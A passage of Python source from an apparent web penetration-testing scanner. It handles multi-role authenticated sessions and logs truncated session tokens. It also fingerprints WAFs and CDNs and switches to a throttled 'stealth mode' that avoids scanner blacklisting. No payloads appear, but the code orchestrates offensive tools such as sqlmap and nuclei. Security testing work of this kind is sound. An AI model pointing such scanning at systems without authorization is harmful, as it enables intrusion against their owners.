            safe_host = _RE_UNSAFE_FNAME.sub("_", f"{target['hostname']}_{target['port']}")
            project_dir = project_dir / safe_host

        out = OutputManager(str(project_dir))
        out.base_url = target["url"]
        _set_http_evidence_dir(out.root)  # §14h: per-request HTTP evidence
        pm  = ProgressManager(project_dir / "checkpoint.json")
        eng = settings.get("engagement", {})
        _pm_year = (eng.get("start_date", "") or "")[:4]
        if not (_pm_year and _pm_year.isdigit()):
            _pm_year = datetime.now().strftime("%Y")
        _write_project_meta(
            Path(cfg["project"]).resolve(),
            tool="fracture",
            client_short=eng.get("client_short", ""),
            year=_pm_year,
            version=VERSION,
        )
        # Dual-write universal meta.json (schema 1.0) for Prometheus UniversalParser.
        _u_dual_write_meta(
            Path(cfg["project"]).resolve(),
            tool="fracture", version=VERSION,
            client_short=eng.get("client_short", ""),
            client_name=eng.get("client_name", ""),
            engagement_name=eng.get("engagement_name", ""),
            target=target.get("url", "") if isinstance(target, dict) else "",
        )
        try:
            import pr0t31n_dep_snapshot as _ds
            _ds.write_snapshot(
                Path(cfg["project"]).resolve(), "fracture", VERSION,
                binaries=["gobuster", "nikto", "sqlmap", "nuclei", "dalfox", "sslscan", "testssl.sh", "whatweb", "wpscan", "ffuf", "feroxbuster", "searchsploit", "shcheck", "mitmdump", "tlsx", "webanalyze"],
                pip_packages=["requests", "colorama", "beautifulsoup4", "selenium", "termcolor", "dnspython"],
            )
        except Exception:
            pass

        if pm.get_state()["completed_phases"]:
            vc.log("Checkpoint found — resuming from previous run", "INFO")

        vc.log(f"Output directory: {project_dir}", "INFO")

        # Build sessions — all sessions are scope-enforcing
        # Build sessions — all sessions are scope-enforcing.
        # For redirect-discovered secondary targets, reuse the auth session that was built
        # for the primary target scan so that the secondary URL is scanned with the same
        # authenticated context rather than triggering a fresh login flow.  Sessions are
        # stored in _role_sessions (keyed by role_idx / "auth2") outside the while loop.
        _r1_label  = _collected_roles[0]["role"] if _collected_roles else ""
        sess       = _make_session(cfg, _scope_hostnames)
        if _is_redirect_target and 0 in _role_sessions:
            auth_sess = _role_sessions[0]
            vc.log(f"[auth] Reusing role-1 session for redirect target {raw_url}", "INFO")
        else:
            auth_sess = _build_auth_session(cfg, "auth", _scope_hostnames,
                                            role_label=_r1_label,
                                            no_interactive=_is_redirect_target)
            if auth_sess:
                _role_sessions[0] = auth_sess
        vc.log(
            f"[auth] login_url after build_auth_session: "
            f"{cfg.get('auth', {}).get('login_url', '(empty)')!r}",
            "INFO",
        )
        if _is_redirect_target and "auth2" in _role_sessions:
            auth2_sess = _role_sessions["auth2"]
        else:
            auth2_sess = _build_auth_session(cfg, "auth2", _scope_hostnames,
                                             no_interactive=_is_redirect_target)
            if auth2_sess:
                _role_sessions["auth2"] = auth2_sess

        _AUTH_HDR_NAMES = frozenset({
            "authorization", "x-auth-token", "x-api-key", "x-csrf-token",
            "x-access-token", "x-session-token", "token",
        })
        _SESSION_TRUNC = 72   # max chars before value is truncated in output

        def _log_session_info(sess_obj: "requests.Session", label: str) -> None:
            """Print cookies, auth headers, and basic-auth in a readable format."""
            def _trunc(v: str) -> str:
                return v if len(v) <= _SESSION_TRUNC else v[:_SESSION_TRUNC] + "…"

            cookies = list(sess_obj.cookies)
            if cookies:
                vc.log(f"[auth:{label}]   Cookies ({len(cookies)}):", "INFO")
                for ck in cookies:
                    flags: list = []
                    if ck.domain:
                        flags.append(ck.domain)
                    if ck.path and ck.path != "/":
                        flags.append(f"path={ck.path}")
                    if ck.secure:
                        flags.append("secure")
                    try:
                        if ck.has_nonstandard_attr("HttpOnly"):
                            flags.append("httponly")
                    except Exception:
                        pass
                    flag_str = f"  ({', '.join(flags)})" if flags else ""
                    vc.log(
                        f"[auth:{label}]     ◦ {ck.name} = "
                        f"{_trunc(ck.value or '')}{flag_str}",
                        "INFO",
                    )

            auth_hdrs = [
                (k, v) for k, v in sess_obj.headers.items()
                if k.lower() in _AUTH_HDR_NAMES
            ]
            if auth_hdrs:
                vc.log(f"[auth:{label}]   Headers:", "INFO")
                for k, v in auth_hdrs:
                    vc.log(f"[auth:{label}]     ◦ {k}: {_trunc(v)}", "INFO")

            if sess_obj.auth is not None:
                try:
                    _u, _p = sess_obj.auth
                    vc.log(
                        f"[auth:{label}]   Basic auth: {_u} / {'*' * min(len(_p), 8)}",
                        "INFO",
                    )
                except Exception:
                    vc.log(f"[auth:{label}]   Basic auth: (set)", "INFO")

        def _report_auth_status(sess_obj: "requests.Session | None",
                                auth_cfg: dict, label: str,
                                primary_enabled: bool = False) -> bool:
            """Log auth result. Returns True if session carries auth signals."""
            if not auth_cfg.get("enabled"):
                if label == "secondary" and primary_enabled:
                    return False
                vc.log(f"[auth:{label}] Authentication not attempted", "INFO")
                return False
            if sess_obj is None:
                vc.log(f"[auth:{label}] Authentication failed — continuing with unauthenticated testing only", "ERROR")
                return False
            _has_cookie  = bool(sess_obj.cookies)
            _has_header  = any(
                k.lower() in _AUTH_HDR_NAMES
                for k in sess_obj.headers
            )
            _has_auth    = sess_obj.auth is not None
            if _has_cookie or _has_header or _has_auth:
                vc.log(f"[auth:{label}] Authentication successful", "SUCCESS")
                _log_session_info(sess_obj, label)
                return True
            vc.log(f"[auth:{label}] Authentication failed — continuing with unauthenticated testing only", "ERROR")
            return False

        _primary_auth_enabled = bool(cfg.get("auth", {}).get("enabled"))
        _primary_ok  = _report_auth_status(auth_sess,  cfg.get("auth",  {}), "primary")
        _report_auth_status(auth2_sess, cfg.get("auth2", {}), "secondary",
                            primary_enabled=_primary_auth_enabled)

        # ── Early authentication_status.json write ──────────────────────────
        # Write the auth status immediately so Crucible displays accurate
        # auth information during the scan (not stale data from a prior run).
        # The landing page probe runs here (before phases) so it doesn't
        # depend on the scan completing.
        try:
            _early_auth_cfg = cfg.get("auth", {})
            if _early_auth_cfg.get("enabled") and auth_sess is not None:
                _early_label = (
                    _early_auth_cfg.get("role_label", "").strip()
                    or (_collected_roles[0]["role"] if _collected_roles else "")
                    or "Admin"
                )
                _early_username = (
                    _early_auth_cfg.get("username", "").strip()
                    or _early_label
                )
                _early_landing_url = ""
                _early_landing_code = 0
                _early_landing_body = ""
                try:
                    _early_r = auth_sess.get(
                        target["url"], timeout=cfg.get("timeout", 10),
                        allow_redirects=True,
                    )
                    _early_landing_url  = _early_r.url
                    _early_landing_code = _early_r.status_code
                    _early_landing_body = _early_r.text[:8192]
                except Exception:
                    pass
                vc.log(
                    f"[auth] Landing page probe: {_early_landing_url} "
                    f"→ HTTP {_early_landing_code}",
                    "INFO",
                )
                # ── Post-login landing page resolution ──
                # When auth succeeded but the landing URL is still on the
                # login page, the real post-login destination is likely a
                # client-side JS redirect (SPA, React bundle, etc.).
                # Use headless Chrome with the auth cookies to observe it.
                if _early_landing_url:
                    try:
                        _early_target_path = urllib.parse.urlparse(
                            target["url"]).path.rstrip("/").lower()
                        _early_landing_path = urllib.parse.urlparse(
                            _early_landing_url).path.rstrip("/").lower()
                        _last_seg = _early_landing_path.rsplit("/", 1)[-1]
                        _early_on_login = (
                            _early_landing_path == _early_target_path
                            or _last_seg == "login")
                        # SPA targets keep the same URL for login and
                        # the authenticated landing page — the routing
                        # is client-side.  When auth cookies that look
                        # like session tokens are already on the session,
                        # skip the expensive headless-browser resolution
                        # (which would time out for JS-rendered apps).
                        if _early_on_login and auth_sess:
                            _spa_auth_names = (
                                "authtoken", "idtoken", "id_token",
                                "access_token", "accesstoken",
                                "refreshtoken", "refresh_token",
                                "jwt", "bearer", "session_token",
                                "x-auth", "sid",
                            )
                            for _ac in auth_sess.cookies:
                                if any(k in _ac.name.lower()
                                       for k in _spa_auth_names):
                                    _early_on_login = False
                                    vc.log(
                                        "[auth] Landing URL matches "
                                        "target URL but auth cookies "
                                        "present (SPA) — accepting "
                                        "as authenticated landing page",
                                        "INFO",
                                    )
                                    break
                        if _early_on_login:
                            vc.log(
                                "[auth] Landing page is still the login URL "
                                "— resolving post-login URL via headless "
                                "browser (client-side redirect detection)",
                                "INFO",
                            )
                            try:
                                _early_spa_url = _resolve_spa_landing(
                                    target, cfg, auth_sess, target["url"])
                                if _early_spa_url:
                                    _esp = urllib.parse.urlparse(
                                        _early_spa_url
                                    ).path.rstrip("/").lower()
                                    _esp_seg = _esp.rsplit("/", 1)[-1]
                                    if (_esp != _early_target_path
                                            and _esp_seg != "login"):
                                        # Verify the URL is reachable
                                        # by the requests session (not
                                        # just the Chrome session).
                                        # Use a plain GET with copied
                                        # cookies — NOT the hooked
                                        # session, which would fire
                                        # the redirect hook and create
                                        # a spurious finding.
                                        _early_browser_only = False
                                        try:
                                            import requests as _rq_verify
                                            _esp_v = _rq_verify.get(
                                                _early_spa_url,
                                                cookies=auth_sess.cookies,
                                                verify=cfg.get(
                                                    "verify_ssl", False),
                                                timeout=cfg.get(
                                                    "timeout", 10),
                                                allow_redirects=False,
                                            )
                                            if _esp_v.status_code in (
                                                    301, 302, 303, 307, 308):
                                                _redir_to = (
                                                    _esp_v.headers
                                                    .get("Location", ""))
                                                _rto_seg = (
                                                    urllib.parse.urlparse(
                                                        _redir_to)
                                                    .path.rsplit("/", 1)[-1]
                                                    .lower())
                                                if _rto_seg == "login":
                                                    _early_browser_only = True
                                        except Exception:
                                            pass
                                        _early_landing_url = _early_spa_url
                                        if _early_browser_only:
                                            vc.log(
                                                f"[auth] Post-login URL "
                                                f"resolved (browser-only): "
                                                f"{_early_spa_url} — "
                                                f"requests session gets 302 "
                                                f"to login; displayed in "
                                                f"Crucible but NOT used as "
                                                f"scan seed",
                                                "WARNING",
                                            )
                                            _early_landing_code = 302
                                        else:
                                            vc.log(
                                                f"[auth] Post-login URL "
                                                f"resolved: "
                                                f"{_early_spa_url}",
                                                "SUCCESS",
                                            )
                                            cfg["_auth_needs_spa_resolve"] = True
                                            _early_landing_code = 200
                                            try:
                                                _esp_r = auth_sess.get(
                                                    _early_spa_url,
                                                    timeout=cfg.get(
                                                        "timeout", 10),
                                                    allow_redirects=True,
                                                )
                                                _early_landing_body = (
                                                    _esp_r.text[:8192])
                                            except Exception:
                                                pass
                                    else:
                                        vc.log(
                                            f"[auth] Browser stayed on "
                                            f"login: {_early_spa_url}",
                                            "INFO",
                                        )
                                else:
                                    vc.log(
                                        "[auth] Headless browser returned "
                                        "no URL — using server-side "
                                        "landing URL",
                                        "INFO",
                                    )
                            except Exception as _esp_e:
                                vc.log(
                                    f"[auth] Landing resolution error: "
                                    f"{_esp_e}",
                                    "WARNING",
                                )
                    except Exception as _spa_det_e:
                        vc.log(
                            f"[auth] Landing detection error: "
                            f"{_spa_det_e}",
                            "WARNING",
                        )
                _write_auth_status(
                    out.root, _early_label, _early_username, "success",
                    auth_sess, _early_landing_url,
                    _early_landing_body, _early_landing_code,
                )
                vc.log(
                    f"[auth] Early auth status written: {_early_label} → "
                    f"{_early_landing_url or '(none)'}",
                    "INFO",
                )
        except Exception as _early_e:
            vc.log(
                f"[auth] Early auth status write failed: {_early_e}",
                "WARNING",
            )

        # Browser-auth fallback is handled inside _build_auth_session (form_login path)
        # where _browser_assisted_login is in scope as a closure. If browser auth
        # succeeded there, auth_sess is already a valid session. If it returned None,
        # we proceed unauthenticated — no further action needed here.

        # Pre-scan connectivity check — retry up to 5 times before proceeding
        _alive_delays = [0, 5, 10, 15, 20]
        _alive_r = None
        for _alive_attempt, _alive_delay in enumerate(_alive_delays, 1):
            if _alive_delay:
                vc.log(
                    f"[pre-scan] Target not responding — waiting {_alive_delay}s before "
                    f"retry (attempt {_alive_attempt}/{len(_alive_delays)})...", "WARNING"
                )
                time.sleep(_alive_delay)
            try:
                # allow_redirects=False: we only need to know the target host
                # responds.  Following redirects through _ScopedSession raises
                # ValueError when the target redirects to a different hostname
                # (e.g. SSO/CAS login on another domain), which would wrongly
                # mark the target as unreachable.
                _alive_r = sess.get(target["url"], timeout=10, allow_redirects=False)
                vc.log(f"[pre-scan] Target reachable (HTTP {_alive_r.status_code})", "INFO")
                # If the target redirects to an out-of-scope host (SSO, CAS,
                # IdP), auto-add that host to the scope so downstream requests
                # can follow the redirect chain.
                if _alive_r.is_redirect or _alive_r.status_code in (301, 302, 303, 307, 308):
                    _redir_loc = _alive_r.headers.get("Location", "")
                    if _redir_loc:
                        try:
                            _redir_host = urllib.parse.urlparse(_redir_loc).hostname
                            if _redir_host and _redir_host not in _scope_hostnames:
                                if _is_auth_provider_host(_redir_host):
                                    vc.log(
                                        f"[scope] Redirect target is an auth provider — "
                                        f"not adding to scope: {_redir_host}",
                                        "INFO",
                                    )
                                else:
                                    _scope_hostnames.add(_redir_host)
                                    vc.log(
                                        f"[scope] Auto-added redirect target to scope: {_redir_host}",
                                        "INFO",
                                    )
                        except Exception:
                            pass
                break
            except Exception as _alive_e:
                if _alive_attempt == len(_alive_delays):
                    vc.log(
                        f"[pre-scan] Target did not respond after {len(_alive_delays)} "
                        f"attempts — proceeding anyway", "WARNING"
                    )
                else:
                    vc.log(f"[pre-scan] Attempt {_alive_attempt} failed: {_alive_e}", "WARNING")

        # ── Proactive WAF / CDN detection ──────────────────────────────────
        # Inspect server header, cookies, and known hostnames to flag aggressive
        # protection layers BEFORE the scan starts hammering them. The most
        # common operator pain (and what got us blacklisted on
        # app.hosting-example.com) is Cloudflare + PythonAnywhere — both
        # block scanners on burst rate, suspicious User-Agent, and path-scan
        # patterns. This warning is the single most important signal an
        # operator needs before continuing.
        if _alive_r is not None:
            try:
                from urllib.parse import urlparse as _up_waf
                _waf_host = (_up_waf(target["url"]).netloc or "").lower()
                _waf_server = (_alive_r.headers.get("Server") or "").lower()
                # Check both alive-response Set-Cookie AND session cookie
                # jar — browser-assisted login may have picked up __cf_bm
                # on a parent domain (e.g. example.com) that the alive
                # response to the subdomain doesn't re-send.
                _alive_ck_names = set(_alive_r.cookies.keys())
                try:
                    _alive_ck_names.update(c.name for c in sess.cookies)
                except Exception:
                    pass
                # Also check the authenticated session — browser-assisted
                # login captures WAF cookies (e.g. __cf_bm on a parent
                # domain like example.com) into auth_sess, not the bare sess.
                if auth_sess is not None and auth_sess is not sess:
                    try:
                        _alive_ck_names.update(c.name for c in auth_sess.cookies)
                    except Exception:
                        pass
                _waf_cookies = " ".join(_alive_ck_names).lower()
                _waf_hdr_blob = " ".join(
                    f"{k}:{v}" for k, v in _alive_r.headers.items()
                ).lower()
                _waf_signals: "list[str]" = []
                if "cloudflare" in _waf_server or "cf-ray" in _waf_hdr_blob \
                        or "__cf_bm" in _waf_cookies or "cf_clearance" in _waf_cookies:
                    _waf_signals.append("Cloudflare")
                if "akamai" in _waf_server or "akamaighost" in _waf_server:
                    _waf_signals.append("Akamai")
                if "awselb" in _waf_server or "x-amzn-trace-id" in _waf_hdr_blob:
                    _waf_signals.append("AWS WAF/ELB")
                if "fastly" in _waf_server or "fastly-debug" in _waf_hdr_blob:
                    _waf_signals.append("Fastly")
                if "imperva" in _waf_server or "incap_ses" in _waf_cookies \
                        or "visid_incap" in _waf_cookies:
                    _waf_signals.append("Imperva/Incapsula")
                if "sucuri" in _waf_server or "x-sucuri" in _waf_hdr_blob:
                    _waf_signals.append("Sucuri")
                if "f5-bigip" in _waf_server or "bigipserver" in _waf_cookies \
                        or "ts01" in _waf_cookies.lower():
                    _waf_signals.append("F5 BIG-IP")
                if "pythonanywhere" in _waf_host or "pythonanywhere" in _waf_hdr_blob:
                    _waf_signals.append("PythonAnywhere (aggressive WAF + Cloudflare)")
                if "x-served-by:" in _waf_hdr_blob and "github" in _waf_hdr_blob:
                    _waf_signals.append("GitHub Pages")
                if _waf_signals:
                    # ── AUTOMATIC stealth-mode reconfiguration ─────────────
                    # Printing recommendations is useless when the scanner
                    # would keep going and burn the next IP anyway. We
                    # IMPLEMENT the recommendations here instead of advising
                    # them. The operator can override afterward by editing
                    # the engagement settings, but the default safe path is
                    # automatic.
                    #
                    # Two tiers:
                    #   WAF-tier: Cloudflare, Akamai, Imperva, Sucuri,
                    #     PythonAnywhere — these actively block scanners.
                    #     → full stealth (disable noisy phases, single thread)
                    #
                    #   LB-tier: F5 BIG-IP (cookie only), AWS ELB (trace
                    #     header only), Fastly (CDN/no WAF evidence),
                    #     GitHub Pages — no inherent scanner blocking.
                    #     → reduced threads only, all phases stay enabled.
                    _has_waf = any(s in _WAF_TIER_PLATFORMS for s in _waf_signals)
                    _NOISY_PHASES = (
                        "ffuf", "vulnscan", "injection", "traversal",
                        "ssrf", "deserialization", "request_smuggling",
                        "mass_assignment",
                        "file_upload_info", "open_redirect",
                        "business_logic", "auth_bypass", "files",
                        "subdomain_takeover",
                        # account_lockout: by design sends N login attempts
                        # — guaranteed to trip Cloudflare's bot-fight mode.
                        "account_lockout",
                        # bfla: many endpoints x several role sessions =
                        # high request burst with auth header rotation.
                        "bfla",
                    )
                    _SAFE_PHASES = (
                        "recon", "screenshot", "tls", "headers",
                        "shcheck", "auth_recon", "logout",
                    )
                    _disabled: list = []
                    _phases_map = cfg.get("phases", {}) or {}
                    if _has_waf:
                        # Full stealth — WAF service detected.
                        for _ph in _NOISY_PHASES:
                            if _phases_map.get(_ph):
                                cfg.setdefault("phases", {})[_ph] = False
                                _disabled.append(_ph)
                    # Reduce concurrency regardless of tier (politeness)
                    _orig_threads = cfg.get("threads", 1)
                    cfg["threads"] = 1
                    _orig_delay = cfg.get("request_delay", 0)
                    if _has_waf:
                        cfg["request_delay"] = 1.5
                    else:
                        # LB-only: mild slowdown instead of full delay
                        cfg["request_delay"] = max(_orig_delay, 0.5)
                    # Reduce auth-time retry/backoff aggressiveness too
                    cfg["timeout"] = max(int(cfg.get("timeout", 10) or 10), 15)

                    vc.log("", "WARNING")
                    vc.log("=" * 70, "WARNING")
                    _tier_label = "WAF/CDN" if _has_waf else "LOAD BALANCER"
                    vc.log(
                        f"[pre-scan] {_tier_label} DETECTED on {_waf_host}: "
                        f"{', '.join(_waf_signals)}",
                        "WARNING",
                    )
                    if _has_waf:
                        vc.log(
                            "[pre-scan] These services actively detect and block "
                            "security scanners. Fracture is automatically "
                            "switching to stealth mode to avoid IP blacklisting.",
                            "WARNING",
                        )
                    else:
                        vc.log(
                            "[pre-scan] Load balancer detected (not a WAF). "
                            "Fracture is reducing concurrency as a courtesy "
                            "but all scan phases remain enabled.",
                            "WARNING",
                        )
                    vc.log(
                        f"[pre-scan] APPLIED: threads "
                        f"{_orig_threads} → 1  (concurrency disabled)",
                        "WARNING",
                    )
                    _new_delay = cfg["request_delay"]
                    vc.log(
                        f"[pre-scan] APPLIED: request_delay "
                        f"{_orig_delay} → {_new_delay}s  (per-response sleep)",
                        "WARNING",
                    )
                    if _disabled:
                        vc.log(
                            f"[pre-scan] APPLIED: disabled "
                            f"{len(_disabled)} noisy phase(s): "
                            f"{', '.join(_disabled)}",
                            "WARNING",
                        )
                    elif _has_waf:
                        vc.log(
                            "[pre-scan] APPLIED: noisy phases already off",
                            "WARNING",
                        )
                    if _has_waf:
                        _still_on = [
                            p for p in _SAFE_PHASES
                            if cfg.get("phases", {}).get(p)
                        ]
                        vc.log(
                            f"[pre-scan] KEPT: {len(_still_on)} safe phase(s) "
                            f"still enabled: {', '.join(_still_on) or '(none)'}",
                            "WARNING",
                        )
                        vc.log(
                            "[pre-scan] To OVERRIDE (use only with written "
                            "authorization + an allow-listed source IP): edit "
                            "the engagement settings to re-enable the disabled "
                            "phases AND ensure the customer has allow-listed "
                            "your egress IP at the CDN/WAF (Cloudflare IP "
                            "Access Rules, Akamai Site Shield, etc.).",
                            "WARNING",
                        )
                    vc.log("=" * 70, "WARNING")
                    vc.log("", "WARNING")
                    # Stash the signals so downstream phases can consult cfg.
                    cfg["_waf_detected"] = _waf_signals
                    # Only set full stealth for WAF-tier — LB-only gets
                    # throttling but phases stay enabled.
                    cfg["_waf_stealth_applied"] = _has_waf
                    # Re-apply throttle to the existing sess (response hook
                    # is wired in _make_session and reads cfg dynamically, so
                    # raising request_delay above already takes effect on the
                    # next request through this session; but if this is the
                    # very first session that was built before request_delay
                    # was set, install the hook now).
                    try:
                        _have_delay_hook = any(
                            getattr(_h, "__name__", "") == "_delay_hook"
                            for _h in sess.hooks.get("response", []) or []
                        )
                    except Exception:
                        _have_delay_hook = False
                    if not _have_delay_hook:
                        def _delay_hook(_response, *_args, **_kwargs):
                            try:
                                _d = float(cfg.get("request_delay", 0) or 0)
                            except (TypeError, ValueError):
                                _d = 0.0
                            if _d > 0:
                                time.sleep(_d)
                            return _response
                        sess.hooks.setdefault("response", []).append(_delay_hook)
                        if auth_sess is not None:
                            auth_sess.hooks.setdefault(
                                "response", []).append(_delay_hook)
                        if auth2_sess is not None:
                            auth2_sess.hooks.setdefault(
                                "response", []).append(_delay_hook)
            except Exception:
                pass
            # Persist WAF/CDN detection to target_profile.json so the
            # Crucible Summary tab displays it immediately — the recon
            # phase will merge additional fields later.
            if _waf_signals:
                try:
                    _pre_wafs = [s for s in _waf_signals if s in _WAF_TIER_PLATFORMS]
                    _pre_lbs  = [s for s in _waf_signals if s not in _WAF_TIER_PLATFORMS]
                    _write_target_profile(
                        out,
                        edge_security=_pre_wafs if _pre_wafs else [],
                        waf=", ".join(_pre_wafs) if _pre_wafs else "",
                        load_balancers=_pre_lbs if _pre_lbs else [],
                    )
                except Exception:
                    pass

        # Redirect tracking — accumulates in-scope redirect destinations found during this scan
        _in_scope_new: list = []
        _attach_redirect_hook(sess, _scope_hostnames, target, out, _in_scope_new)
        if auth_sess:
            _attach_redirect_hook(auth_sess, _scope_hostnames, target, out, _in_scope_new)
        if auth2_sess:
            _attach_redirect_hook(auth2_sess, _scope_hostnames, target, out, _in_scope_new)

        # ------------------------------------------------------------------
        # Build per-credential contexts from auth_matrix + unauthenticated.
        # All non-privilege phases run once per context so that vulnerabilities
        # reachable only under elevated credentials are not missed.
        # Privilege-escalation phases (authorization, cross_user, access_matrix)
        # run once after all contexts — they require cross-role comparison and
        # must not be executed with a single elevated identity.
        # ------------------------------------------------------------------
        phases_enabled = cfg.get("phases", {})

        def _skip(phase_name: str) -> bool:
            _check_pause()
            if not phases_enabled.get(phase_name, False):
                vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                vc.status(phase_name, phase_name, "skipped")
                pm.set_phase_status(phase_name, "skipped", phase_name)
                return True
            if pm.is_phase_complete(phase_name):
                vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                return True
            return False

        # Build per-credential contexts
        # When _n_roles >= 1 (interactive multi-role mode):
        #   - Role 1 (most permissive): full scan, all phases.
        #   - Roles 2..n: reduced scan — authorization/session/bypass only,
        #     using role 1's discovered crawl data.
        #   - Unauthenticated: same reduced scan as roles 2..n.
        # When _n_roles == 0: existing auth_matrix behaviour (settings-file driven).
        _vulnscan_handle = None  # set by _launch_vulnscan_bg, collected before summary
        _vulnscan_ctx_label = "" # ctx label that launched vulnscan, for checkpoint key
        _zap_handle = None       # set by _launch_zap_bg, collected before summary
        _cred_contexts: list = []
        if _n_roles >= 1:
            # Role 1 — full scan (most permissive user)
            _r1 = _collected_roles[0]
            _r1_cfg = copy.deepcopy(cfg)
            vc.log(
                f"[auth] _r1_cfg login_url after deepcopy: "
                f"{_r1_cfg.get('auth', {}).get('login_url', '(empty)')!r}",
                "INFO",
            )
            _r1_cfg["auth"]["enabled"]  = True
            _r1_cfg["auth"]["username"] = _r1["username"]
            _r1_cfg["auth"]["password"] = _r1["password"]
            # Reuse the already-built auth_sess — role 1's cfg matches cfg["auth"],
            # so calling _build_auth_session again would re-run the full login flow
            # (including any interactive prompts) for a second time unnecessarily.
            _r1_as = auth_sess if isinstance(auth_sess, requests.Session) else \
                _build_auth_session(_r1_cfg, "auth", _scope_hostnames, role_label=_r1["role"])
            if _r1_as:
                _attach_redirect_hook(_r1_as, _scope_hostnames, target, out, _in_scope_new)
            _cred_contexts.append({
                "label": _r1["role"], "cfg": _r1_cfg, "auth_sess": _r1_as,
                "reduced": False, "multi_role": True, "role_idx": 0,
            })
            # Any roles already collected (e.g. second target, creds collected earlier)
            # auth_sess is intentionally left None here; it is built lazily at the
            # start of each context iteration so that browser-auth prompts for roles
            # 2..n appear AFTER role 1 finishes, not before any phases have run.
            # Propagate the login URL that role 1 discovered/used so that roles
            # 2..n skip the full discovery phase (including Selenium rendering,
            # JS bundle scanning, and spidering) and go straight to the login
            # page.  The same login URL is shared by all roles on a given target.
            # Also propagate the login profile fingerprint match — _lp_match will
            # be called with the same URL and will find the same stored profile,
            # allowing _lp_replay to authenticate subsequent roles automatically
            # using their own credentials without opening a browser window.
            _r1_login_url = _r1_cfg.get("auth", {}).get("login_url", "").strip()
            for _ri, _rc in enumerate(_collected_roles[1:], start=1):
                _rn_cfg = copy.deepcopy(cfg)
                _rn_cfg["auth"]["enabled"]  = True
                _rn_cfg["auth"]["username"] = _rc["username"]
                _rn_cfg["auth"]["password"] = _rc["password"]
                if _r1_login_url and not _rn_cfg.get("auth", {}).get("login_url", "").strip():
                    _rn_cfg["auth"]["login_url"] = _r1_login_url
                _cred_contexts.append({
                    "label": _rc["role"], "cfg": _rn_cfg, "auth_sess": None,
                    "reduced": True, "multi_role": True, "role_idx": _ri,
                })
        else:
            # Existing settings-file auth_matrix behaviour
            for _rc in (cfg.get("auth_matrix") or []):
                _r_label = _rc.get("role") or f"ctx{len(_cred_contexts) + 1}"
                _r_cfg   = copy.deepcopy(cfg)
                _r_cfg["auth"]["enabled"]  = True
                _r_cfg["auth"]["username"] = _rc.get("username", "")
                _r_cfg["auth"]["password"] = _rc.get("password", "")
                _r_as    = _build_auth_session(_r_cfg, "auth", _scope_hostnames, role_label=_r_label)
                if _r_as:
                    _attach_redirect_hook(_r_as, _scope_hostnames, target, out, _in_scope_new)
                _cred_contexts.append({
                    "label": _r_label, "cfg": _r_cfg, "auth_sess": _r_as,
                    "reduced": False, "multi_role": False, "role_idx": -1,
                })
        # Unauthenticated context always last.
        # Reduced if multi-role mode (role 1 already ran the full scan).
        _r_unauth_cfg = copy.deepcopy(cfg)
        _r_unauth_cfg["auth"]["enabled"] = False
        _cred_contexts.append({
            "label": "unauthenticated", "cfg": _r_unauth_cfg, "auth_sess": None,
            "reduced": _n_roles >= 1, "multi_role": False, "role_idx": -1,
        })

        # Seed access_matrix.json with the full role list before scanning starts.
        # _write_structure_map fires repeatedly during recon/gobuster and calls
        # _write_preliminary_access_matrix(out, target, []).  Without seeding,
        # the roles list in access_matrix.json stays empty and the Crucible
        # frontend falls back to showing a single "Unauthenticated" column even
        # while an authenticated role is being tested.  The seed is written once
        # here so every subsequent preliminary write merges into (and preserves)
        # the correct column list.
        try:
            _seed_roles = [_c["label"] for _c in _cred_contexts]
            _write_preliminary_access_matrix(out, target, _seed_roles)
        except Exception:
            pass

        # Accumulators for post-context privilege phases
        _combined_auth_recon: dict = {"forms": [], "links": [], "resource_ids": []}
        _all_crawl_links:     list = []
        _discovered_creds_seen: set = set()  # avoid duplicate contexts from discovered creds
        # Crawl data from role 1 (most permissive); passed to reduced contexts so they
        # test accessibility to the same paths without re-crawling.
        _role1_crawl_data: dict = {"forms": [], "params": [], "links": []}
        # Discovery phase outputs — populated during Role 1's context, reused by all others.
        wc_baseline: object = None
        _wp_discovered_paths: list = []
        _ep_base: list = []
        # BFLA: endpoints that returned 200 for Role 1, tested against all other roles.
        # Each entry: {"url": str, "status": int, "body_len": int, "role1_label": str}
        _role1_accessible_endpoints: list = []
        # CDN/WAF detected by _phase_recon; used to modulate injection/testing phases.
        _scan_waf_cdn: str = ""

        # ── Checkpoint resume: restore accumulated state ─────────────────────
        if args.resume and pm.has_resumable_state():
            _rstate = pm.prepare_resume()
            _ss = _rstate.get("scan_state", {})
            vc.log("[resume] Restoring checkpoint state …", "INFO")
            # Accumulators
            _ep_base                    = _ss.get("ep_base", _ep_base)
            _all_crawl_links            = _ss.get("all_crawl_links", _all_crawl_links)
            _role1_crawl_data           = _ss.get("role1_crawl_data", _role1_crawl_data)
            _wp_discovered_paths        = _ss.get("wp_discovered_paths", _wp_discovered_paths)
            _combined_auth_recon        = _ss.get("combined_auth_recon", _combined_auth_recon)
            _role1_accessible_endpoints = _ss.get("role1_accessible_endpoints",
                                                   _role1_accessible_endpoints)
            _scan_waf_cdn               = _ss.get("scan_waf_cdn", _scan_waf_cdn)
            wc_baseline                 = _ss.get("wc_baseline", wc_baseline)
            _discovered_creds_seen      = set(_ss.get("discovered_creds_seen", []))
            # Discovery leader
            _discovery_leader           = _ss.get("discovery_leader", _discovery_leader)
            _discovery_leader_score     = _ss.get("discovery_leader_score",
                                                   _discovery_leader_score)
            # Role landing URLs
            _role_landing_urls.update(_ss.get("role_landing_urls", {}))
            # Auth sessions — rebuild from stored cookies/headers.
            # The full re-auth path via _build_auth_session runs for each
            # context inside the context loop, but pre-seeding cookies from the
            # checkpoint ensures that cookie-only auth methods (where
            # _build_auth_session just sets cookies) resume without an extra
            # login round-trip.  For form-login/SSO methods the cookies may be
            # stale, so _build_auth_session re-authenticates normally.
            for _rlabel, _rauth in _ss.get("role_sessions_auth", {}).items():
                try:
                    _rsess = _make_session(cfg, _scope_hostnames)
                    _restore_session_auth(_rsess, _rauth)
                    _completed_role_sessions[_rlabel] = _rsess
                    # Inject restored session into the matching context entry
                    # so phases that use _ctx_auth have a pre-seeded session.
                    for _rctx in _cred_contexts:
                        if _rctx["label"] == _rlabel and _rctx["auth_sess"] is None:
                            _rctx["auth_sess"] = _rsess
                            break
                except Exception:
                    pass
            # Move files from phases that were running to _interrupted/
            _interrupted_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            _interrupted_dir = out.root / "_interrupted" / _interrupted_ts
            _stash_running = _rstate.get("phase_status", {})
            for _sph, _spv in _stash_running.items():
                if _spv.get("status") == "pending":
                    # This was 'running' before prepare_resume demoted it.
